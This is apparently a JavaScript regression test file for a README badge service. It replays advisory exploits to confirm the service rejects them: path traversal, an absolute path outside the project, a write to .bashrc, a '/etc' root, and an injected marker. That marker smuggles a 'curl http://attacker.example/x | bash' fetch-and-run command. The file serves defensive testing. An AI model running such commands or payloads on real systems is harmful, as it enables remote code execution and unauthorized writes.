/**
 * Regression tests for GHSA-5x56-587v-mv4r and GHSA-42v3-pcpq-j7fq.
 *
 * Each case replays the exploit from the advisory: an unauthenticated caller
 * naming a file outside the project, or smuggling a comment-closing marker, to
 * turn a badge update into an arbitrary write.
 */

import { expect } from 'chai';

import { mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { readmeBadgesService } from '../src/service.js';

describe('readme-badges security', () => {
  let base;
  let root;
  let outsideFile;
  let previousRoot;

  beforeEach(() => {
    base = mkdtempSync(join(tmpdir(), 'readme-badges-'));
    root = join(base, 'project');
    mkdirSync(root, { recursive: true });
    writeFileSync(join(root, 'README.md'), '# Project\n\nBody\n');

    outsideFile = join(base, 'target-sensitive.md');
    writeFileSync(outsideFile, 'ORIGINAL_SENSITIVE_CONTENT\n');

    previousRoot = process.env.README_BADGES_ROOT;
    process.env.README_BADGES_ROOT = root;
  });

  afterEach(() => {
    if (previousRoot === undefined) {
      delete process.env.README_BADGES_ROOT;
    } else {
      process.env.README_BADGES_ROOT = previousRoot;
    }
    rmSync(base, { recursive: true, force: true });
  });

  it('still updates a README inside the project root', async () => {
    const outcome = await readmeBadgesService.updateReadme({
      readmePath: 'README.md',
      badges: ['react'],
      insertAt: 'bottom',
    });

    expect(outcome.changed).to.equal(true);
    expect(readFileSync(join(root, 'README.md'), 'utf8')).to.contain('readme-badges:start');
  });

  it('refuses an absolute path outside the project root (advisory PoC)', async () => {
    let threw = false;
    try {
      await readmeBadgesService.updateReadme({
        readmePath: outsideFile,
        badges: [{ label: 'OWNED', color: 'red', link: 'https://example.com/pwned' }],
        insertAt: 'bottom',
        marker: 'poc-vuln-001',
      });
    } catch (error) {
      threw = true;
      expect(error.code).to.equal('UNSAFE_PATH');
    }

    expect(threw, 'updateReadme should reject the path').to.equal(true);
    expect(readFileSync(outsideFile, 'utf8')).to.equal('ORIGINAL_SENSITIVE_CONTENT\n');
  });

  it('refuses traversal out of the project root', async () => {
    let threw = false;
    try {
      await readmeBadgesService.updateReadme({
        readmePath: '../target-sensitive.md',
        badges: ['react'],
        insertAt: 'bottom',
      });
    } catch (error) {
      threw = true;
      expect(error.code).to.equal('UNSAFE_PATH');
    }

    expect(threw).to.equal(true);
    expect(readFileSync(outsideFile, 'utf8')).to.equal('ORIGINAL_SENSITIVE_CONTENT\n');
  });

  it('refuses non-markdown targets such as a shell profile', async () => {
    const profile = join(root, '.bashrc');
    writeFileSync(profile, 'export PATH=$PATH\n');

    let threw = false;
    try {
      await readmeBadgesService.updateReadme({
        readmePath: '.bashrc',
        badges: ['react'],
        insertAt: 'bottom',
      });
    } catch (error) {
      threw = true;
      expect(error.code).to.equal('UNSAFE_PATH');
    }

    expect(threw).to.equal(true);
    expect(readFileSync(profile, 'utf8')).to.equal('export PATH=$PATH\n');
  });

  it('refuses a marker that would close the HTML comment and inject content', async () => {
    let threw = false;
    try {
      await readmeBadgesService.updateReadme({
        readmePath: 'README.md',
        badges: ['react'],
        insertAt: 'bottom',
        marker: 'x -->\ncurl http://attacker.example/x | bash\n#',
      });
    } catch (error) {
      threw = true;
      expect(error.message).to.contain('Invalid marker');
    }

    expect(threw).to.equal(true);
    expect(readFileSync(join(root, 'README.md'), 'utf8')).to.not.contain('attacker.example');
  });

  it('accepts a well-formed marker', async () => {
    const outcome = await readmeBadgesService.updateReadme({
      readmePath: 'README.md',
      badges: ['node'],
      insertAt: 'bottom',
      marker: 'my_badges-1',
    });

    expect(outcome.marker).to.equal('my_badges-1');
  });

  it('contains rootDir for tech detection', async () => {
    let threw = false;
    try {
      await readmeBadgesService.detectTech({ rootDir: '/etc' });
    } catch (error) {
      threw = true;
      expect(error.code).to.equal('UNSAFE_PATH');
    }

    expect(threw).to.equal(true);
  });
});
